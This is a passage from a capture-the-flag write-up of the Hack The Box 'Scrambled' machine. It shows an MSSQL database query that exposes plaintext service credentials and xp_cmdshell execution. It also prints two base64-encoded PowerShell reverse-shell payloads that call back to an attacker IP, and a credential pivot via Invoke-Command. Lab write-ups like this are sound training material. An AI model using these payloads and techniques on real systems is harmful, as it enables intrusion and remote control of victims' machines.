<span id="cb26-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">--------------------------------------------------------------------------------------------</span></span>
<span id="cb26-4"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">master</span>                                                                                                                             </span>
<span id="cb26-5">tempdb                                                                                                                             </span>
<span id="cb26-6">model                                                                                                                              </span>
<span id="cb26-7">msdb                                                                                                                               </span>
<span id="cb26-8">ScrambleHR</span>
<span id="cb26-9"></span>
<span id="cb26-10">SQL<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">use</span> ScrambleHR</span>
<span id="cb26-11">[<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>] ENVCHANGE(<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">DATABASE</span>): <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">Old</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Value</span>: <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">master</span>, <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">New</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Value</span>: ScrambleHR</span>
<span id="cb26-12">[<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>] INFO(DC1): Line <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>: Changed <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">database</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">context</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">to</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ScrambleHR'</span>.</span>
<span id="cb26-13"></span>
<span id="cb26-14">SQL<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">select</span> table_name <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">from</span> information_schema.<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">tables</span></span>
<span id="cb26-15">table_name                                                                                                                         </span>
<span id="cb26-16"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-------------------------------------------------------------------------------------------- </span></span>
<span id="cb26-17">Employees                                                                                                                          </span>
<span id="cb26-18">UserImport                                                                                                                         </span>
<span id="cb26-19">Timesheets </span>
<span id="cb26-20"></span>
<span id="cb26-21">SQL<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">select</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">from</span> UserImport</span>
<span id="cb26-22">LdapUser                                             LdapPwd                                              LdapDomain                                           RefreshInterval   IncludeGroups   </span>
<span id="cb26-23"></span>
<span id="cb26-24"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">--------------------------------------------------   --------------------------------------------------   --------------------------------------------------   ---------------   -------------   </span></span>
<span id="cb26-25"></span>
<span id="cb26-26">MiscSvc                                              ScrambledEggs9900                                    scrm.<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">local</span>                                                        <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">90</span>               <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>   </span></code></pre></div>
<p>A new set of credentials: <code>MiscSvc:ScrambledEggs9900</code></p>
<p>Lets step it up and see if we can enable and execute commands with <code>xp_cmdshell</code>:</p>
<div class="sourceCode" id="cb27" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SQL</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> enable_xp_cmdshell</span>
<span id="cb27-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SQL</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami</span>
<span id="cb27-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">scrm\sqlsvc</span></span></code></pre></div>
<p>Instead of uploading <code>nc64.exe</code> or similar we can just use revshells.com <em>PowerShell #3 (Base64)</em> to get a quick and simple shell.</p>
<p><img src="https://exploit.se/posts/2022-09-16-htb-writeup-scrambled/images/scrambled05.png" class="img-fluid"></p>
<div class="sourceCode" id="cb28" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SQL</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> xp_cmdshell powershell <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-e</span> JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAiACwANAA0ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=</span></code></pre></div>
<div class="sourceCode" id="cb29" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb29-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4488</span>
<span id="cb29-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb29-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.7</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.168]</span> 64463</span>
<span id="cb29-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\W</span>indows<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\s</span>ystem32<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami</span>
<span id="cb29-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">scrm\sqlsvc</span></span>
<span id="cb29-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\s</span>qlsvc<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>esktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> ls</span>
<span id="cb29-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PS</span> C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> ls  </span>
<span id="cb29-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Mode</span>                LastWriteTime         Length Name                                                                  </span>
<span id="cb29-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">----</span>                <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-------------</span>         <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">------</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">----</span>                                                                  </span>
<span id="cb29-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">d-----</span>       05/11/2021     21:28                administrator                                                         </span>
<span id="cb29-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">d-----</span>       03/11/2021     19:31                miscsvc                                                               </span>
<span id="cb29-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">d-r---</span>       26/01/2020     17:54                Public                                                                </span>
<span id="cb29-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">d-----</span>       01/06/2022     14:58                sqlsvc </span></code></pre></div>
<p>The user-flag is not possession of <code>sqlsvc</code>, so we probably need to pivot to <code>miscsvc</code>. I like to do this using below commands:</p>
<div class="sourceCode" id="cb30" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb30-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$user</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'scrm.local\miscsvc'</span></span>
<span id="cb30-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$pass</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ScrambledEggs9900'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ConvertTo-SecureString</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>AsPlainText <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Force</span>
<span id="cb30-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$creds</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">New-Object</span> System<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Management</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Automation</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PSCredential</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$user</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$pass</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb30-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Invoke-Command</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>ComputerName localhost <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Credential <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$creds</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>ScriptBlock <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> whoami <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb30-5">scrm\miscsvc</span></code></pre></div>
<p>Generate a new reverse shell from revshells.com and fire:</p>
<div class="sourceCode" id="cb31" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb31-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Invoke-Command</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>ComputerName localhost <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Credential <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$creds</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>ScriptBlock <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> powershell <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAiACwANAA0ADkAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span>ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span>ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
<div class="sourceCode" id="cb32" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb32-1">➜  scrambled nc <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>lvnp <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4499</span></span>
<span id="cb32-2"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">listening</span> on <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>any<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4499</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb32-3">connect to <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10.14.7</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">from</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>UNKNOWN<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10.11.168</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">61678</span></span>
<span id="cb32-4"></span>
<span id="cb32-5"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\miscsvc\Documents<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami</span>
<span id="cb32-6">scrm\miscsvc</span>
<span id="cb32-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\miscsvc\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ls</span></span>
<span id="cb32-8">Mode                LastWriteTime         Length Name                                              </span>
<span id="cb32-9"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>                <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-------------</span>         <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">------</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>                                              </span>
<span id="cb32-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>ar---       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">15</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">09</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2022</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">08</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">26</span>             <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">34</span> user<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">txt</span></span>
<span id="cb32-11"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\miscsvc\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">type</span> user<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">txt</span></span>
<span id="cb32-12">5fcdc64885d9b2497f0bb5b97c4650f6</span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1---more-enumeration" class="level3">
<h3 class="anchored" data-anchor-id="step-1---more-enumeration">Step 1 - More enumeration</h3>
<p>Looking on <code>miscsvc</code>’s privileges nothing stands out, however there are two custom groups added.</p>
<div class="sourceCode" id="cb33" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb33-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\miscsvc<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>all</span>
<span id="cb33-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[...</span> snip <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...]</span></span>
<span id="cb33-3">SCRM\ITShare                                <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Group</span>            S-1-5-21-2743207045-1827831105-2542523200-1609 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb33-4">SCRM\ITUsers                                <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Group</span>            S-1-5-21-2743207045-1827831105-2542523200-1610 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span></code></pre></div>
<p>There is no PowerShell history:</p>
<div class="sourceCode" id="cb34" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb34-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\miscsvc\AppData\Roaming\Microsoft\Windows<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Get-Childitem</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>force</span>
<span id="cb34-2">Mode                LastWriteTime         Length Name                                              </span>
<span id="cb34-3"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>                <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-------------</span>         <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">------</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>                                              </span>
<span id="cb34-4">d-----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">15</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">09</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2018</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">08</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19</span>                CloudStore                                        </span>
<span id="cb34-5">d-----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">15</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">09</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2018</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">08</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19</span>                Network Shortcuts                                 </span>
<span id="cb34-6">d-----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">15</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">09</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2018</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">08</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19</span>                Printer Shortcuts                                 </span>
<span id="cb34-7">d-r---       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">15</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">09</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2018</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">08</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19</span>                Recent                                            </span>
<span id="cb34-8">d-r---       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">15</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">09</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2018</span>     <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">08</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19</span>                SendTo                                            </span>
<span id="cb34-9">d-r---       <span class="dv" style="color: #AD0000;
background-color: null;
